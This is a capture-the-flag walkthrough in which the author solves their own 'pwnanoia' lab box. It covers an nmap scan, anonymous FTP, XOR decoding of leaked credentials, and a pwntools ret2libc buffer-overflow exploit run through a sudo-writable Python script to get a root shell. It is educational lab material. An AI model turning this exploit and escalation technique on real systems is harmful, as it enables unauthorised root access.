This write-up / walkthrough will provide my full process for finishing my own CTF, the pwnanoia CTF

First, we start by modifying `/etc/hosts` to associate the IP address with the host.

<img width="697" height="65" alt="Pasted image 20251221010544" src="https://github.com/user-attachments/assets/e61062e4-6be2-4d4f-b0ee-d733cdbe4e08" />

We then proceed to take a look at the website.

![[Pasted image 20251221010605.png]]

It seems to be some kind of strange cult using this server. Let’s move on to a port scan with nmap

![[Pasted image 20251221010745.png]]

We now know that an FTP service is running. Let’s try to connect to it using the username anonymous

![[Pasted image 20251221011024.png]]

We find a `.txt` file named **announcement**, which explains that a subdomain called `ascend.thecult.thm` exists. Let’s modify our `/etc/hosts` file again to see where this subdomain leads us.

![[Pasted image 20251221011300.png]]

We find three pages on the website:

A main page:

![[Pasted image 20251221011335.png]]

A privacy page, explaining how adepts need to protect themselves:

![[Pasted image 20251221011706.png]]

And a final page: the archive page, simulating a shell, containing a `creds.txt` file.

![[Pasted image 20251221011742.png]]

The `creds.txt` file gives us the following:

```
KEY1 = a6c8b6733c9b22de7bc0253266a3867df55acde8635e19c73313
KEY1 ^ 2 = 5fecb164e51b118318d221ac21215fc424d3d738c492aaf8f019
KEY2 ^ 3 = d6398b781a61255339a352ff4aeeca89f1d1cfb3958bcc98ae0a
USER ^ KEY1 ^ KEY2 ^ KEY3 = 0382552b479e62fd365911a2402123836de5653e80b0a726e971199f5a3c11
```

The `^` symbol is used to describe XOR. We now know that the **USER** value is a string XORed with **KEY1**, **KEY2**, and **KEY3**.

We also know that XOR is commutative, which means that if we know one key, we can find the others. Since we already know **KEY1**, we can retrieve **KEY2**. With **KEY2**, we can retrieve **KEY3**, and finally, with all keys, we can recover the user.

Let’s put this into practice using Python and execute the following script:

 ```python
 from pwn import *

key1 = bytes.fromhex("a6c8b6733c9b22de7bc0253266a3867df55acde8635e19c73313")

key1_2 = "5fecb164e51b118318d221ac21215fc424d3d738c492aaf8f019"
key2_3 = "d6398b781a61255339a352ff4aeeca89f1d1cfb3958bcc98ae0a"
flag_key123 = "0382552b479e62fd365911a2402123836de5653e80b0a726e971199f5a3c11"

key2 = xor(bytes.fromhex(key1_2), key1)
key3 = xor(bytes.fromhex(key2_3), key2)
key1_2_3 = xor(bytes.fromhex(key1_2), key3)

flag = xor(bytes.fromhex(flag_key123), key1_2_3)

print(flag.decode())

 ```
![[Pasted image 20251221013441.png]]

Perfect! We now have the SSH credentials for a user named **adept**. Let’s log in to this account.

![[Pasted image 20251221013609.png]]

Once connected via SSH, we find the user flag, a Python file, and an ELF binary. Let’s check our sudo permissions.

![[Pasted image 20251221013825.png]]

Good. We now know that we can run `file.py` using **sudo** with Python, and that we can edit `file.py` using **nano**. Let’s run **checksec** on the ELF binary.

![[Pasted image 20251221013947.png]]

NX is enabled and it is a 64-bit ELF. We are going to attempt a **ret2libc** attack in order to execute `/bin/sh` with sudo, which will give us a root shell.

First, we find the libc base address.

![[Pasted image 20251221014411.png]]

Then the `system` address:

![[Pasted image 20251221014431.png]]

The `/bin/sh` address:

![[Pasted image 20251221014451.png]]

A `pop rdi` gadget:

![[Pasted image 20251221014514.png]]

And finally, a `ret` gadget:

```
...
0x000000000040101a : ret
...
```

Now we just need to assemble everything into an exploit and write it into `file.py` using sudo.

```python
#!/usr/bin/env python3  
from pwn import *  
  
p = process('./usr-verif')  
  
libc_base = 0x00007ffff7dcf000  
system = libc_base + 0x52290  
binsh = libc_base + 0x1b45bd  
  
POP_RDI = 0x0000000000401203  
RET     = 0x000000000040101a  
print(cyclic(200))  
  
payload  = b"A" * 72  
payload += p64(POP_RDI)  
payload += p64(binsh)  
payload += p64(RET)     
payload += p64(system)  
p.clean()  
p.sendline(payload)  
p.interactive()

```

Now let’s execute our exploit.

![[Pasted image 20251221022426.png]]

And… we’re root!  
All that’s left is to retrieve the root flag from the `/root` directory  the CTF is complete! 
